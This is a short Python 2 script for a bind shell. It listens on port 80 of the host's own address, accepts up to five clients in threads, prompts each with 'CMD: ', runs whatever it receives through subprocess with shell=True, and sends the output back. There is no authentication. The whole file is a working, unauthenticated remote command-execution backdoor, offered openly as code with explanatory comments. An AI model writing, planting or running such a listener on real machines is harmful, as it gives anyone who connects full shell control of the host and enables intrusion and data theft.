import socket
import subprocess
import sys
import threading

# global variable, empty list to contain all connections
connections = []

def run_command(command):
    
    # trims the new line character
    command = command.rstrip()
    
    try:
        # attempts to run command
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        # outputs invalid if improper command
        output = "Invalid\n"
    
    # returns output
    return output

# client handling thread function
def handle_connection(conn, addr):
    while True: 
        global connections

        # sends a command promt to the connected user
        conn.send(bytes("CMD: "))
        
        # recieves incoming command and runs it, stores the output
        output = run_command(conn.recv(1024))
        
        # returns the output to the connection
        conn.send(bytes(output))
        
        if not output:
            connections.remove(conn)
            conn.close()
            break

def main():
    # determines the ip address of the host computer
    bind_ip = socket.gethostbyname(socket.gethostname())
    bind_port = 80
    
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    server.bind((bind_ip, bind_port))
    
    # socket listens to incoming connections
    # limit of 5, additional connections refused
    server.listen(5)
    
    print "Listening on %s:%d" % (bind_ip, bind_port)
        
    while True:
        
        conn, addr = server.accept()
        
        # starts the thread to handle incoming data
        connection_thread = threading.Thread(target=handle_connection, args=(conn, addr))
        
        # the program will be able to exit regardless if any threads are still running
        connection_thread.daemon = True
        
        connection_thread.start()
        connections.append(conn)        
        
main()